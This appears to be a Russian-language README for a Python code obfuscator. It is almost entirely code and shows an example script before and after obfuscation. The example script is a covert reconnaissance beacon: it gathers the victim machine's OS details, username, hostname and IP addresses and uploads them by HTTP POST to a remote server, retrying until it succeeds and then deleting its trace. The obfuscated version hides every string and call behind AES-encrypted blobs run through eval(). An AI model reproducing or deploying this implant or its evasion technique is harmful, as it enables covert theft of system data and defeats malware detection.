Перед запуском нужно указать директорию, в которой находится проект:
```py
# путь до проекта
path_project = "./dir"
```

После чего запускаем программу:
```bash
python3 obfuscator.py
```

Пример исходного файла:
```py
import platform
import getpass
import socket
import os
import requests
from time import sleep
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
try:
    import netifaces as ni
except ModuleNotFoundError:
    pass
ip_addr_server = 'https://domain.name'
port_server = '443'
url_server = "/url"
sleep(15)
def sysinfo():
    os_type = platform.system()
    os_version = platform.version()
    os_release = platform.release()  
    os_architecture = platform.architecture()
    os_machine = platform.machine()
    os_network = platform.node()
    os_username = getpass.getuser()
    os_hostname = socket.gethostname()
    str_os_typy__windows = "Windows"
    str_os_typy__linux = "Linux"
    if os_type == str_os_typy__windows:
        os_host_ip = socket.gethostbyname(os_hostname)
    elif os_type == str_os_typy__linux:
        os_host_ip = []
        resulting_interfaces = ni.interfaces()
        for resulting_interface in resulting_interfaces:
            try:
                ip_addresses = ni.ifaddresses(resulting_interface)
                if ni.AF_INET in ip_addresses:
                    ipv4_address = ip_addresses[ni.AF_INET][0]['addr']
                    subnet_mask = ip_addresses[ni.AF_INET][0].get('netmask', '')
                    os_host_ip.append(f"{ipv4_address} / {subnet_mask}")
            except Exception as e:
                pass
    str_os_type = "OS type:"
    str_os_version = "Version:"
    str_os_release = "Release:"
    str_os_architecture = "Architecture:"
    str_os_machine = "Type machine:"
    str_os_network = "Network name:"
    str_os_username = "User:"
    str_os_hostname = "Hostname:"
    str_os_host_ip = "Local_ip:"
    return ((f'{str_os_type} {os_type}') + '\n'
            + (f"{str_os_version} {os_version}") + '\n'
            + (f"{str_os_release} {os_release}") + '\n'
            + (f'{str_os_architecture} {os_architecture}') + '\n'
            + (f'{str_os_machine} {os_machine}') + '\n'
            + (f'{str_os_network} {os_network}') + '\n'
            + (f'{str_os_username} {os_username}') + '\n'
            + (f'{str_os_hostname} {os_hostname}') + '\n'
            + (f'{str_os_host_ip} {os_host_ip}'))
def sending_file(ip_addr_server, port_server, url_server, file):
    while True:
        try:
            with open(file, 'rb') as f:
                file_data = {'file': f}
                full_url = ip_addr_server + ':' + port_server + url_server
                received_response = requests.post(full_url, files=file_data)
            break
        except Exception as e:
            sleep(30)
def main():
    global ip_addr_server
    global port_server
    global url_server
    file_name_result = socket.gethostname()
    result = sysinfo()
    with open(file_name_result, 'w') as f:
        f.write(result)
    sending_file(ip_addr_server, port_server, url_server, file_name_result)
    os.remove(file_name_result)
if __name__ == "__main__":
    main()
```

Файл после обфускации:
```py
fcjzwCmxijvuckkrbe = b'\xb7\x8b\x9bZ\xe7\xc2\xb35\xe7\xd9\t\x96\xea\x92v\xec\x83\xb9\x0c;LP1\x19\xbf\x8fO\x1c\xffj)('
def tzdndShotqr(riogqQfzbguiddehg, imaaaBtuoryofwp):
    euqvoEcjsvrjcltx = AES.new(imaaaBtuoryofwp, AES.MODE_ECB)
    pfpnqWcgmo = unpad(euqvoEcjsvrjcltx.decrypt(riogqQfzbguiddehg), AES.block_size)
    return pfpnqWcgmo
import platform
import getpass
import socket
import os
import requests
from time import sleep
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
try:
    import netifaces as ni
except ModuleNotFoundError:
    pass
tcutdJqjdxo = tzdndShotqr(b"Qs\xaeF\xda\xbf\xbf\x88R\xea\x17\x12\xa16\xbd\xe6\x0e3\x88\xdep\x8bL\xd2.'\xbc\x08\xd1}\xd6!", fcjzwCmxijvuckkrbe).decode()
xokftNpabeq = tzdndShotqr(b'\x10Xb^\\~\xfcL3\x19\xc6\xdc\x009\x11\n', fcjzwCmxijvuckkrbe).decode()
mfbwmJfqnwjvaucnbdpb = tzdndShotqr(b'P\x05\xeb\r\x9csn8\x88\xc6\xd2\xaa\x99x\xae\xb4M\xc5\xbf\x9d\x99\xfb\x00\xc0\xe3M\xa0\xaf\xdf4\xa0\x01', fcjzwCmxijvuckkrbe).decode()
sleep(1)
def bnswbKcjchc():
    wnhvkJwdgwcjuxjwk = b'k\xb0\x0fp4\x03\xe9D\xe0\x01\xd5Z}\xc1\x85\xa42\xc56\x9f\xc0\x81\xaf\t\xe5\x08k!\x81\xd5\xcc\xf0'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    wwwxyKfizmvslnrmj = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'%\x17IzO\xf4\x18\x0b\x062\xd2\xc9\x91\x85\x87\x1eZ&\xd9\xc73\x86\x81\xc2\x942a\xdd\xae\x1a!\xab'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    vqfybRhexsnmh = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b"o'\xf3\x0f%\xd0\x19\x1c<\xa6\xdeP\x9f,\x1d\x10O\xbb\x9b\x1a\xc3\x96Y}\x8f\xd5J\x17M\xe5\xce\x01"
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    jaeorLepdfwllqinwaiz = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'r\xe8\x14&\xd1G\x05\xbbbk\xdd\x83c\xb5\xacG\xfb%\xcc\xb8\xdd3\x0b\xa7/\x1bP\xe2IZq\x0b'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    dsagrNyzflkgavnr = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'\x91\x1c O\xa3\xd2r\xe5_\x88\xda \x95[V\xc3Z&\xd9\xc73\x86\x81\xc2\x942a\xdd\xae\x1a!\xab'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    ejwudZseqfakxsofnk = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'\xfa]d\xe2\xa2\x91(#r\x9d\xda1T\x1b\xa8\x9a'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    isqdiAoexkdithj = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'\xf9\xac\xf9smk\xf4r\xd0s~\x9b$\xa2tg2\xc56\x9f\xc0\x81\xaf\t\xe5\x08k!\x81\xd5\xcc\xf0'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    ijfdwLlqmmaas = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'\xf0\xb7\x12\x81\x1a\x8frr)\xdb\x08\x0b7\xf7\xf7\xc7\xffo\xc9\xef\xc7B\xf9\x8b\xbdN\xa7e9|\x99d'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    uqkviMqdws = eval(wnhvkJwdgwcjuxjwk)
    rodigOocns = tzdndShotqr(b'\xf5(\xa0hwzW\x9d\xd9wp\x97[\xb8\x91\xec', fcjzwCmxijvuckkrbe).decode()
    sfaziWrfzrudnpe = tzdndShotqr(b'Q\xdf\xcf\x82\x1aB\xc7\xd2\xcb\x98&U\xb4\x0enH', fcjzwCmxijvuckkrbe).decode()
    if wwwxyKfizmvslnrmj == rodigOocns:
        wnhvkJwdgwcjuxjwk = b'Y!\x80`\x8a\xcd5@Ei\xfcR]|\x97g\x04\x06P-\xd4\xdd\xb7\xb5f\x13IY&3B0\xc4\xc7\xfb\x1c\x81\x0f\xea\xf1\xce)\x9euid,\xdb'
        wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
        iqurxXdgxiue = eval(wnhvkJwdgwcjuxjwk)
    elif wwwxyKfizmvslnrmj == sfaziWrfzrudnpe:
        wnhvkJwdgwcjuxjwk = b'\xfb\xb7W\xbd \xffa\xbe-L\xf1\xe27\x9d5\xeb'
        wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
        iqurxXdgxiue = eval(wnhvkJwdgwcjuxjwk)
        wnhvkJwdgwcjuxjwk = b'z~\x93IY\xd2[\xea\x8b\xab\xfa\xdeG\xeaf\xc2'
        wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
        jvaccRzybkv = eval(wnhvkJwdgwcjuxjwk)
        for djoumJltsuing_interface in jvaccRzybkv:
            try:
                hbltcHdjeszifpqvfsbx = ni.ifaddresses(djoumJltsuing_interface)
                if ni.AF_INET in hbltcHdjeszifpqvfsbx:
                    fpkaqXvwnznb = hbltcHdjeszifpqvfsbx[ni.AF_INET][0]['addr']
                    rhvqvPxeiug = hbltcHdjeszifpqvfsbx[ni.AF_INET][0].get('netmask', '')
                    iqurxXdgxiue.append(f"{fpkaqXvwnznb} / {rhvqvPxeiug}")
            except Exception as e:
                pass
    pldcwZmgonwk = tzdndShotqr(b'^\xc5\x04\x0eJ|Lc\xd9T\xd0\\&\x8e\xca-', fcjzwCmxijvuckkrbe).decode()
    pghehQofodljwetmvxz = tzdndShotqr(b']\xc8p\xb3\x90N\x0b\xc4\xc4\xd9\xcd\x03\xd7=\xb9\x8a', fcjzwCmxijvuckkrbe).decode()
    fqbpeBpktwhjutzdzcs = tzdndShotqr(b':\xf2\xb8XtP\xe5\xba\t\x12\xaa\x06\xc7\xbdrK', fcjzwCmxijvuckkrbe).decode()
    xtkttVisgqwhqddij = tzdndShotqr(b'?\x06\xfa\xeb\xc2\\\x0b\x1b\xad\xaaSz\xa9\xcaOS', fcjzwCmxijvuckkrbe).decode()
    hspjtKkagoeatdhz = tzdndShotqr(b'E\xfb\xf5\xb8]\x93dNj\x981\xa9\x1f\xc9\xee\x18', fcjzwCmxijvuckkrbe).decode()
    gregtCompmdkkivgxwsc = tzdndShotqr(b'n\xe8\xe8\xe7\x18(\xff~9\x0c\x8f\xc4M\xb45\xa3', fcjzwCmxijvuckkrbe).decode()
    uvbsgGahzfio = tzdndShotqr(b'\x98\x9f\x1a\xa5p\x82\x1fX\x0c\xa6\xf2\xed\x07\x85\xf5\x12', fcjzwCmxijvuckkrbe).decode()
    qnaknOteywmmeujikeer = tzdndShotqr(b'\xa2\x90N\xab9\xff\r\xd6\x12\x18\xa9\xa5f\xe0\x8c\xe9', fcjzwCmxijvuckkrbe).decode()
    ybizhJhrrmiulgyzxmwb = tzdndShotqr(b'\xbe(V\x81\x8dH\x13\xd4y\xeb\x98\xc2\x8djy#', fcjzwCmxijvuckkrbe).decode()
    return ((f'{pldcwZmgonwk} {wwwxyKfizmvslnrmj}') + '\n'
            + (f"{pghehQofodljwetmvxz} {vqfybRhexsnmh}") + '\n'
            + (f"{fqbpeBpktwhjutzdzcs} {jaeorLepdfwllqinwaiz}") + '\n'
            + (f'{xtkttVisgqwhqddij} {dsagrNyzflkgavnr}') + '\n'
            + (f'{hspjtKkagoeatdhz} {ejwudZseqfakxsofnk}') + '\n'
            + (f'{gregtCompmdkkivgxwsc} {isqdiAoexkdithj}') + '\n'
            + (f'{uvbsgGahzfio} {ijfdwLlqmmaas}') + '\n'
            + (f'{qnaknOteywmmeujikeer} {uqkviMqdws}') + '\n'
            + (f'{ybizhJhrrmiulgyzxmwb} {iqurxXdgxiue}'))
def lrigxQtexcqtzqhgecc(tcutdJqjdxo, xokftNpabeq, mfbwmJfqnwjvaucnbdpb, file):
    while True:
        try:
            with open(file, 'rb') as f:
                ywzpgIdukkfluqcmntw = {'file': f}
                qkjteXwwjnexfdopwrw = tcutdJqjdxo + ':' + xokftNpabeq + mfbwmJfqnwjvaucnbdpb
                wnhvkJwdgwcjuxjwk = b"\x8a\x0f\x11\xab\xb3\xa8/\xd1.x\xa9\xd5\xa9)q\xba\xab>:2\xc3\xe7\x8cdm\xad\x85\xf4\xa83:w\x03\xe6\xfczK)y\xb8\xf5i\x13\x9f\x93'F\x1cI\x14\xf2\x8b\x03@\xd2%\xca\xe2\x06\xaaB\xf9\x8d\x02"
                wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
                njmwiVlpzgrmswze = eval(wnhvkJwdgwcjuxjwk)
            break
        except Exception as e:
            sleep(30)
def main():
    global tcutdJqjdxo
    global xokftNpabeq
    global mfbwmJfqnwjvaucnbdpb
    wnhvkJwdgwcjuxjwk = b'\xf0\xb7\x12\x81\x1a\x8frr)\xdb\x08\x0b7\xf7\xf7\xc7\xffo\xc9\xef\xc7B\xf9\x8b\xbdN\xa7e9|\x99d'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    rrpblYnizjxbwvcyuobr = eval(wnhvkJwdgwcjuxjwk)
    wnhvkJwdgwcjuxjwk = b'\xcb\xe9\xae\x8e\xf5|\xaf\x9c\xf4K0\xc4\xfa\xa3.\x9f'
    wnhvkJwdgwcjuxjwk = tzdndShotqr(wnhvkJwdgwcjuxjwk, fcjzwCmxijvuckkrbe)
    djoumJltsu = eval(wnhvkJwdgwcjuxjwk)
    with open(rrpblYnizjxbwvcyuobr, 'w') as f:
        f.write(djoumJltsu)
    lrigxQtexcqtzqhgecc(tcutdJqjdxo, xokftNpabeq, mfbwmJfqnwjvaucnbdpb, rrpblYnizjxbwvcyuobr)
    os.remove(rrpblYnizjxbwvcyuobr)
if __name__ == "__main__":
    main()
```